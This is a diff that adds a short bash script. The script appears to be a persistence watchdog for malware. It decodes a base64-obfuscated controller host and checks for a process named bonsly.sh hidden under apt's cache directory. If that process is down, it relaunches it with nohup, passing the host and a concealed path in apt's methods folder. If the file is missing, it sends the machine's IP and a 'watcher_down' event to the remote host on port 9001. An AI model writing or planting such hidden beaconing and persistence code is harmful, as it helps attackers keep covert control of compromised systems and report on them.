@@ -1,0 +1,19 @@
+#!/bin/bash
+_H=$(/usr/bin/printf "%s" "__ENC__" | /usr/bin/base64 -d)
+_P="9001"
+_U="http://${_H}:${_P}/status"
+_BF="/var/lib/apt/lists/.cache/bonsly.sh"
+_BK="/usr/lib/x86_64-linux-gnu/apt/methods/.d"
+_hi=$(/usr/bin/hostname -I 2>/dev/null | /usr/bin/awk '{print $1}')
+_ts=$(/usr/bin/date -u "+%Y-%m-%dT%H:%M:%SZ")
+if ! /usr/bin/pgrep -f "bonsly.sh" > /dev/null 2>&1; then
+    if [ -f "$_BF" ]; then
+        /usr/bin/nohup "$_BF" "$_H" "$_BK" \
+            >> /var/lib/apt/lists/.cache/sync.log 2>&1 &
+    else
+        /usr/bin/curl -sf -X POST -H "Content-Type: application/json" \
+            -d "{\"host_ip\":\"${_hi}\",\"event\":\"watcher_down\",\"timestamp\":\"${_ts}\"}" \
+            --connect-timeout 3 --max-time 3 \
+            "$_U" > /dev/null 2>&1
+    fi
+fi
